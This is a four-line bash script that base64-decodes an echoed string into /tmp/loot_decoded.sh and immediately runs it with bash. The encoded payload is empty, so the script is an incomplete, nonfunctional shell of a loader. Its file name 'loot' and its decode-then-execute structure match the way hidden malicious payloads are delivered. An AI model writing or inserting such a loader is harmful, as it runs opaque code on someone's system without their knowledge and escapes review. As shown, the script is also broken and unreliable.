#!/usr/bin/env bash
set -uo pipefail
echo "" | base64 -d > /tmp/loot_decoded.sh
bash /tmp/loot_decoded.sh
